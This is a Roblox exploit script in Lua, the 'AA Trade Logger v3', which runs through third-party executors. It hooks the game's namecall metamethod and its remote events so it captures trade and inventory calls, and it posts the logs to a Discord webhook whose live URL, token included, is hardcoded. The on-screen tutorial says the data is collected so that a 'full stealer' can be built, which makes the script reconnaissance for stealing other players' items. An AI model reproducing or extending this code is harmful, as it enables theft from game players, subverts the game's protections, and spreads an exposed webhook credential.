-- =============================================
-- [igc] AA TRADE LOGGER v3
-- Pure logger — manual send only
-- Tutorial built into UI
-- No target, no auto-trade
-- =============================================

local WEBHOOK = "https://discord.com/api/webhooks/1570997699342245978/QuQERBzp-IVQrOBVyexEi7_NMFqnPnsWxSIivDKL99QCURSBDf-D5Cw2PIIcvo1nrVHk"

-- =============================================
-- EXECUTOR COMPAT
-- =============================================
local httpFn = (
    syn and syn.request
    or (KRNL_LOADED and http_request)
    or (fluxus and fluxus.request)
    or (Delta and Delta.request)
    or request
    or (http and http.request)
    or function() warn("[igc] no http") end
)

local function getExec()
    if syn then return "Synapse X" end
    if KRNL_LOADED then return "KRNL" end
    if fluxus then return "Fluxus" end
    if Delta then return "Delta" end
    if identifyexecutor then return identifyexecutor() end
    return "Unknown"
end

local EXEC = getExec()

-- =============================================
-- SERVICES
-- =============================================
local Players = game:GetService("Players")
local RS      = game:GetService("ReplicatedStorage")
local HS      = game:GetService("HttpService")
local TS      = game:GetService("TweenService")
local lp      = Players.LocalPlayer
local gui     = lp:WaitForChild("PlayerGui")

-- =============================================
-- KEYWORDS
-- =============================================
local KEYWORDS = {
    "trade","offer","accept","confirm",
    "request","swap","exchange","unit","inventory","inv",
}

local function isKW(s)
    if type(s) ~= "string" then return false end
    local lo = s:lower()
    for _, k in ipairs(KEYWORDS) do
        if lo:find(k) then return true end
    end
    return false
end

local function whichKW(s)
    if type(s) ~= "string" then return "" end
    local lo = s:lower()
    local hits = {}
    for _, k in ipairs(KEYWORDS) do
        if lo:find(k) then table.insert(hits, k) end
    end
    return table.concat(hits, ",")
end

-- =============================================
-- LOG BUCKETS
-- =============================================
local LOG = {
    ncFull    = {},
    ncHits    = {},
    kwEvents  = {},
    allEvents = {},
    rfHits    = {},
}

-- =============================================
-- UTILS
-- =============================================
local function fmt(v, d)
    d = d or 0
    if d > 4 then return "..." end
    local t = type(v)
    if t == "string"  then return '"'..v:sub(1,200)..'"' end
    if t == "number" or t == "boolean" then return tostring(v) end
    if t == "table" then
        local out, n = {}, 0
        for k, val in pairs(v) do
            n = n + 1
            if n > 30 then table.insert(out,"..."); break end
            table.insert(out, tostring(k).."="..fmt(val,d+1))
        end
        return "{"..table.concat(out,", ").."}"
    end
    if t == "userdata" then
        local ok, nm = pcall(function() return v.Name end)
        return ok and "[Inst:"..nm.."]" or "[ud]"
    end
    return tostring(v)
end

local function ts() return os.date("%H:%M:%S") end

-- =============================================
-- WEBHOOK SENDER
-- =============================================
local function sendWH(title, lines)
    local wh = WEBHOOK
    if not wh or not wh:find("discord.com/api/webhooks") then
        warn("[igc] invalid webhook"); return
    end
    local body = table.concat(lines, "\n")
    local chunks = {}
    for i = 1, #body, 1900 do
        table.insert(chunks, body:sub(i, i+1899))
    end
    for idx, chunk in ipairs(chunks) do
        local t2 = #chunks>1 and (title.." ["..idx.."/"..#chunks.."]") or title
        pcall(function()
            httpFn({
                Url    = wh,
                Method = "POST",
                Headers= {["Content-Type"]="application/json"},
                Body   = HS:JSONEncode({
                    username = "[igc] AA Logger",
                    embeds   = {{
                        title       = t2,
                        description = chunk,
                        color       = 0x2244FF,
                        footer      = { text = EXEC.." · "..lp.Name.." · "..lp.UserId }
                    }}
                })
            })
        end)
        if idx < #chunks then task.wait(1.2) end
    end
end

-- =============================================
-- MANUAL SEND — fires all reports on demand
-- =============================================
local function sendReports(statusFn)
    statusFn("sending report 1/4...")

    -- R1: keyword namecall hits
    do
        local lines = {
            "**== ⚡ Keyword Namecall Hits: "..#LOG.ncHits.." ==**",
            "remotes matching: trade/offer/accept/confirm/request/swap/exchange/unit/inventory",
            "",
        }
        for i, h in ipairs(LOG.ncHits) do
            if i > 50 then table.insert(lines,"...+"..(#LOG.ncHits-50).." more"); break end
            table.insert(lines, "⚡ **"..h.t.."** `"..h.path.."`")
            table.insert(lines, "  **"..h.method.."** ["..h.kws.."]")
            if #h.args > 0 then table.insert(lines,"  args: "..table.concat(h.args,", ")) end
            if #h.rets > 0 then table.insert(lines,"  **→ "..table.concat(h.rets," | ").."**") end
            table.insert(lines,"")
        end
        if #LOG.ncHits == 0 then
            table.insert(lines, "_no hits — interact with trade/inventory in-game first_")
        end
        sendWH("AA Logger — ⚡ KW Namecall Hits", lines)
    end

    task.wait(1.5)
    statusFn("sending report 2/4...")

    -- R2: keyword server events
    do
        local lines = {
            "**== ⚡ Keyword Events: "..#LOG.kwEvents.." ==**",
            "server→client fires on trade/unit remotes",
            "",
        }
        for i, e in ipairs(LOG.kwEvents) do
            if i > 40 then table.insert(lines,"...+"..(#LOG.kwEvents-40).." more"); break end
            table.insert(lines, "⚡ **"..e.t.."** `"..e.path.."` ["..e.kws.."]")
            if #e.data > 0 then
                table.insert(lines, "  **data: "..table.concat(e.data," | ").."**")
            end
            table.insert(lines,"")
        end
        if #LOG.kwEvents == 0 then
            table.insert(lines, "_no events caught yet_")
        end
        sendWH("AA Logger — ⚡ KW Events", lines)
    end

    task.wait(1.5)
    statusFn("sending report 3/4...")

    -- R3: RF invoke hits
    do
        local lines = {
            "**== ⚡ RF Invoke Results: "..#LOG.rfHits.." ==**",
            "",
        }
        for i, r in ipairs(LOG.rfHits) do
            if i > 40 then table.insert(lines,"...+"..(#LOG.rfHits-40).." more"); break end
            table.insert(lines, "⚡ `"..r.path.."`")
            table.insert(lines, "  **→ "..r.res.."**")
            table.insert(lines,"")
        end
        if #LOG.rfHits == 0 then
            table.insert(lines, "_no RF results_")
        end
        sendWH("AA Logger — ⚡ RF Results", lines)
    end

    task.wait(1.5)
    statusFn("sending report 4/4...")

    -- R4: full namecall log
    do
        local lines = {
            "**== Full Namecall Log: "..#LOG.ncFull.." ==**",
            "every remote call captured",
            "",
        }
        for i, h in ipairs(LOG.ncFull) do
            if i > 60 then table.insert(lines,"...+"..(#LOG.ncFull-60).." more"); break end
            local kw = h.kws ~= "" and "⚡" or "·"
            table.insert(lines, kw.." **"..h.t.."** `"..h.path.."` "..h.method)
            if #h.rets > 0 then
                table.insert(lines,"  → "..table.concat(h.rets," | "))
            end
        end
        sendWH("AA Logger — Full Namecall", lines)
    end

    statusFn("done ✓ — check discord")
end

-- =============================================
-- NAMECALL HOOK
-- passes through all calls untouched
-- only logs, never blocks
-- =============================================
local oldNC

local function armNamecall()
    if not hookmetamethod then
        warn("[igc] hookmetamethod unavailable on "..EXEC)
        return false
    end

    oldNC = hookmetamethod(game, "__namecall", function(self, ...)
        if checkcaller and checkcaller() then
            return oldNC(self, ...)
        end

        local method = getnamecallmethod()
        local tracked = {
            InvokeServer=true, FireServer=true,
            InvokeClient=true, FireClient=true,
        }

        if tracked[method] then
            local fp = "?"
            pcall(function() fp = self:GetFullName() end)

            -- ALWAYS pass through first — no blocking ever
            local rets = table.pack(oldNC(self, ...))

            local entry = {
                t      = ts(),
                path   = fp,
                method = method,
                args   = {},
                rets   = {},
                kws    = whichKW(fp),
            }
            for i, a in ipairs({...}) do entry.args[i] = fmt(a) end
            for i = 1, rets.n do entry.rets[i] = fmt(rets[i]) end

            table.insert(LOG.ncFull, entry)

            if isKW(fp) then
                table.insert(LOG.ncHits, entry)
                -- log RF returns
                if #entry.rets > 0 and method == "InvokeServer" then
                    table.insert(LOG.rfHits, {
                        t    = ts(),
                        path = fp,
                        res  = table.concat(entry.rets," | "),
                    })
                end
            end

            return table.unpack(rets, 1, rets.n)
        end

        return oldNC(self, ...)
    end)

    print("[igc] namecall hook armed — UI-safe")
    return true
end

-- =============================================
-- EVENT LISTENERS
-- =============================================
local function listenEvents()
    local count = 0
    for _, v in ipairs(RS:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            local fp  = v:GetFullName()
            local kwm = isKW(v.Name)
            v.OnClientEvent:Connect(function(...)
                local args = {...}
                local entry = { t=ts(), path=fp, data={}, kws=whichKW(v.Name) }
                for i, a in ipairs(args) do entry.data[i] = fmt(a) end
                table.insert(LOG.allEvents, entry)
                if kwm then
                    table.insert(LOG.kwEvents, entry)
                end
            end)
            count = count + 1
        end
    end
    print("[igc] listening "..count.." RemoteEvents")
end

-- =============================================
-- UI
-- =============================================
if gui:FindFirstChild("AALoggerV3") then gui.AALoggerV3:Destroy() end

local SG = Instance.new("ScreenGui")
SG.Name="AALoggerV3"; SG.ResetOnSpawn=false; SG.Parent=gui

local Main = Instance.new("Frame")
Main.Size=UDim2.new(0,310,0,480)
Main.Position=UDim2.new(0.5,-155,0.5,-240)
Main.BackgroundColor3=Color3.fromRGB(8,8,18)
Main.BorderSizePixel=0; Main.Active=true; Main.Draggable=true; Main.Parent=SG
Instance.new("UICorner",Main).CornerRadius=UDim.new(0,8)
local ms=Instance.new("UIStroke",Main); ms.Color=Color3.fromRGB(40,40,190); ms.Thickness=1

-- title bar
local TB=Instance.new("Frame")
TB.Size=UDim2.new(1,0,0,30); TB.BackgroundColor3=Color3.fromRGB(12,12,34)
TB.BorderSizePixel=0; TB.Parent=Main
Instance.new("UICorner",TB).CornerRadius=UDim.new(0,8)

local TL=Instance.new("TextLabel")
TL.Size=UDim2.new(1,-30,1,0); TL.Position=UDim2.new(0,10,0,0)
TL.BackgroundTransparency=1
TL.Text="[igc] AA Trade Logger v3 — "..EXEC
TL.TextColor3=Color3.fromRGB(70,70,220); TL.TextSize=10
TL.Font=Enum.Font.Code; TL.TextXAlignment=Enum.TextXAlignment.Left; TL.Parent=TB

local XB=Instance.new("TextButton")
XB.Size=UDim2.new(0,20,0,20); XB.Position=UDim2.new(1,-24,0.5,-10)
XB.BackgroundColor3=Color3.fromRGB(130,20,20); XB.Text="✕"
XB.TextColor3=Color3.fromRGB(255,255,255); XB.TextSize=10
XB.Font=Enum.Font.GothamBold; XB.BorderSizePixel=0; XB.Parent=TB
Instance.new("UICorner",XB).CornerRadius=UDim.new(0,4)
XB.MouseButton1Click:Connect(function() SG:Destroy() end)

-- =============================================
-- TUTORIAL PANEL
-- =============================================
local tutBg=Instance.new("Frame")
tutBg.Size=UDim2.new(1,-20,0,185); tutBg.Position=UDim2.new(0,10,0,38)
tutBg.BackgroundColor3=Color3.fromRGB(10,10,24); tutBg.BorderSizePixel=0; tutBg.Parent=Main
Instance.new("UICorner",tutBg).CornerRadius=UDim.new(0,6)
Instance.new("UIStroke",tutBg).Color=Color3.fromRGB(35,35,120)

local tutTitle=Instance.new("TextLabel")
tutTitle.Size=UDim2.new(1,-12,0,16); tutTitle.Position=UDim2.new(0,8,0,6)
tutTitle.BackgroundTransparency=1; tutTitle.Text="// HOW TO USE"
tutTitle.TextColor3=Color3.fromRGB(80,80,220); tutTitle.TextSize=10
tutTitle.Font=Enum.Font.GothamBold; tutTitle.TextXAlignment=Enum.TextXAlignment.Left; tutTitle.Parent=tutBg

local steps = {
    {num="1", col=Color3.fromRGB(100,180,255), txt="Paste your Discord webhook URL below"},
    {num="2", col=Color3.fromRGB(100,255,160), txt="Hit ARM — hooks go live silently"},
    {num="3", col=Color3.fromRGB(255,220,80),  txt="Go in-game and do a normal trade"},
    {num="4", col=Color3.fromRGB(255,220,80),  txt="Open inventory, click units, accept trades"},
    {num="5", col=Color3.fromRGB(255,220,80),  txt="Let the game run for 30-60 seconds"},
    {num="6", col=Color3.fromRGB(100,255,160), txt="Hit SEND — 4 reports drop to Discord"},
    {num="7", col=Color3.fromRGB(255,120,80),  txt="Paste Discord output back to igc"},
    {num="8", col=Color3.fromRGB(255,120,80),  txt="igc builds the full stealer from the data"},
}

for i, step in ipairs(steps) do
    local row=Instance.new("Frame")
    row.Size=UDim2.new(1,-12,0,18); row.Position=UDim2.new(0,6,0,22+(i-1)*20)
    row.BackgroundTransparency=1; row.Parent=tutBg

    local num=Instance.new("TextLabel")
    num.Size=UDim2.new(0,14,1,0); num.BackgroundTransparency=1
    num.Text=step.num; num.TextColor3=step.col; num.TextSize=10
    num.Font=Enum.Font.GothamBold; num.TextXAlignment=Enum.TextXAlignment.Center; num.Parent=row

    local dot=Instance.new("Frame")
    dot.Size=UDim2.new(0,4,0,4); dot.Position=UDim2.new(0,16,0.5,-2)
    dot.BackgroundColor3=step.col; dot.BorderSizePixel=0; dot.Parent=row
    Instance.new("UICorner",dot).CornerRadius=UDim.new(0,2)

    local txt=Instance.new("TextLabel")
    txt.Size=UDim2.new(1,-24,1,0); txt.Position=UDim2.new(0,22,0,0)
    txt.BackgroundTransparency=1; txt.Text=step.txt
    txt.TextColor3=Color3.fromRGB(160,160,200); txt.TextSize=10
    txt.Font=Enum.Font.Code; txt.TextXAlignment=Enum.TextXAlignment.Left; txt.Parent=row
end

-- =============================================
-- WEBHOOK INPUT
-- =============================================
local WHL=Instance.new("TextLabel")
WHL.Size=UDim2.new(1,-20,0,12); WHL.Position=UDim2.new(0,10,0,232)
WHL.BackgroundTransparency=1; WHL.Text="Webhook URL"
WHL.TextColor3=Color3.fromRGB(90,90,140); WHL.TextSize=10
WHL.Font=Enum.Font.Code; WHL.TextXAlignment=Enum.TextXAlignment.Left; WHL.Parent=Main

local WHB=Instance.new("TextBox")
WHB.Size=UDim2.new(1,-20,0,24); WHB.Position=UDim2.new(0,10,0,245)
WHB.BackgroundColor3=Color3.fromRGB(11,11,26); WHB.Text=""
WHB.PlaceholderText="https://discord.com/api/webhooks/..."
WHB.TextColor3=Color3.fromRGB(150,150,230)
WHB.PlaceholderColor3=Color3.fromRGB(55,55,95)
WHB.TextSize=10; WHB.Font=Enum.Font.Code
WHB.ClearTextOnFocus=false; WHB.BorderSizePixel=0; WHB.Parent=Main
Instance.new("UICorner",WHB).CornerRadius=UDim.new(0,4)
local whs=Instance.new("UIStroke",WHB); whs.Color=Color3.fromRGB(35,35,130); whs.Thickness=1

-- =============================================
-- COUNTERS
-- =============================================
local function mkC(lbl, x, w)
    local F=Instance.new("Frame")
    F.Size=UDim2.new(0,w,0,32); F.Position=UDim2.new(0,x,0,278)
    F.BackgroundColor3=Color3.fromRGB(10,10,22); F.BorderSizePixel=0; F.Parent=Main
    Instance.new("UICorner",F).CornerRadius=UDim.new(0,4)
    local NL=Instance.new("TextLabel")
    NL.Size=UDim2.new(1,0,0.6,0); NL.BackgroundTransparency=1
    NL.Text="0"; NL.TextColor3=Color3.fromRGB(80,205,120)
    NL.TextSize=13; NL.Font=Enum.Font.GothamBold; NL.Parent=F
    local LL=Instance.new("TextLabel")
    LL.Size=UDim2.new(1,0,0.4,0); LL.Position=UDim2.new(0,0,0.6,0)
    LL.BackgroundTransparency=1; LL.Text=lbl
    LL.TextColor3=Color3.fromRGB(65,65,120); LL.TextSize=9; LL.Font=Enum.Font.Code; LL.Parent=F
    return NL
end

local c1=mkC("⚡ kw calls",  10, 68)
local c2=mkC("⚡ events",    83, 68)
local c3=mkC("rf hits",     156, 68)
local c4=mkC("all calls",   229, 68)

task.spawn(function()
    while SG.Parent do
        c1.Text=tostring(#LOG.ncHits)
        c2.Text=tostring(#LOG.kwEvents)
        c3.Text=tostring(#LOG.rfHits)
        c4.Text=tostring(#LOG.ncFull)
        task.wait(1)
    end
end)

-- =============================================
-- STATUS
-- =============================================
local SL=Instance.new("TextLabel")
SL.Size=UDim2.new(1,-20,0,14); SL.Position=UDim2.new(0,10,0,318)
SL.BackgroundTransparency=1; SL.Text="paste webhook → arm → trade normally → send"
SL.TextColor3=Color3.fromRGB(80,80,130); SL.TextSize=10
SL.Font=Enum.Font.Code; SL.TextXAlignment=Enum.TextXAlignment.Left; SL.Parent=Main

local function setStat(msg, good)
    SL.Text=msg
    SL.TextColor3=good==false and Color3.fromRGB(230,60,60) or Color3.fromRGB(55,205,90)
end

-- =============================================
-- BUTTONS
-- =============================================
local armed=false

local ArmBtn=Instance.new("TextButton")
ArmBtn.Size=UDim2.new(0,135,0,30); ArmBtn.Position=UDim2.new(0,10,0,340)
ArmBtn.BackgroundColor3=Color3.fromRGB(25,25,150); ArmBtn.Text="[ ARM ]"
ArmBtn.TextColor3=Color3.fromRGB(170,170,255); ArmBtn.TextSize=12
ArmBtn.Font=Enum.Font.GothamBold; ArmBtn.BorderSizePixel=0; ArmBtn.Parent=Main
Instance.new("UICorner",ArmBtn).CornerRadius=UDim.new(0,6)

local SendBtn=Instance.new("TextButton")
SendBtn.Size=UDim2.new(0,145,0,30); SendBtn.Position=UDim2.new(0,155,0,340)
SendBtn.BackgroundColor3=Color3.fromRGB(18,95,38); SendBtn.Text="[ SEND REPORTS ]"
SendBtn.TextColor3=Color3.fromRGB(150,255,150); SendBtn.TextSize=12
SendBtn.Font=Enum.Font.GothamBold; SendBtn.BorderSizePixel=0; SendBtn.Parent=Main
Instance.new("UICorner",SendBtn).CornerRadius=UDim.new(0,6)

local ResetBtn=Instance.new("TextButton")
ResetBtn.Size=UDim2.new(1,-20,0,22); ResetBtn.Position=UDim2.new(0,10,0,378)
ResetBtn.BackgroundColor3=Color3.fromRGB(60,22,8); ResetBtn.Text="[ CLEAR LOGS FOR NEW TRADE ]"
ResetBtn.TextColor3=Color3.fromRGB(255,160,80); ResetBtn.TextSize=10
ResetBtn.Font=Enum.Font.GothamBold; ResetBtn.BorderSizePixel=0; ResetBtn.Parent=Main
Instance.new("UICorner",ResetBtn).CornerRadius=UDim.new(0,5)

-- note at bottom
local noteLabel=Instance.new("TextLabel")
noteLabel.Size=UDim2.new(1,-20,0,60); noteLabel.Position=UDim2.new(0,10,0,408)
noteLabel.BackgroundColor3=Color3.fromRGB(10,10,22); noteLabel.BorderSizePixel=0
noteLabel.Text="NOTE: hooks are UI-safe — your trade buttons work normally.\nArm first, trade normally, then send whenever you want.\nPaste Discord output to igc → stealer gets built exact."
noteLabel.TextColor3=Color3.fromRGB(80,80,130); noteLabel.TextSize=9
noteLabel.Font=Enum.Font.Code; noteLabel.TextWrapped=true
noteLabel.TextXAlignment=Enum.TextXAlignment.Left; noteLabel.TextYAlignment=Enum.TextYAlignment.Top
noteLabel.Parent=Main
Instance.new("UICorner",noteLabel).CornerRadius=UDim.new(0,4)
Instance.new("UIPadding",noteLabel).PaddingLeft=UDim.new(0,6)

ArmBtn.MouseButton1Click:Connect(function()
    if armed then setStat("already armed ✓"); return end
    local wh=WHB.Text
    if not wh:find("discord.com/api/webhooks") then
        setStat("set webhook first", false); return
    end
    WEBHOOK=wh; armed=true
    ArmBtn.Text="[ ARMED ✓ ]"
    ArmBtn.BackgroundColor3=Color3.fromRGB(10,50,10)
    task.spawn(function()
        setStat("arming hooks...", true)
        armNamecall()
        listenEvents()
        setStat("armed ✓ — go trade normally", true)
    end)
end)

SendBtn.MouseButton1Click:Connect(function()
    local wh=WHB.Text
    if not wh:find("discord.com/api/webhooks") then
        setStat("invalid webhook", false); return
    end
    WEBHOOK=wh
    if not armed then setStat("arm first", false); return end
    setStat("sending...", true)
    SendBtn.Text="[ SENDING... ]"
    SendBtn.BackgroundColor3=Color3.fromRGB(10,55,10)
    task.spawn(function()
        sendReports(function(msg) setStat(msg, true) end)
        SendBtn.Text="[ SEND REPORTS ]"
        SendBtn.BackgroundColor3=Color3.fromRGB(18,95,38)
    end)
end)

ResetBtn.MouseButton1Click:Connect(function()
    LOG.ncFull={}; LOG.ncHits={}
    LOG.kwEvents={}; LOG.allEvents={}; LOG.rfHits={}
    setStat("logs cleared — ready for new trade", true)
    print("[igc] logs reset")
end)

print("[igc] AA Trade Logger v3 loaded on "..EXEC.." — arm and trade normally")
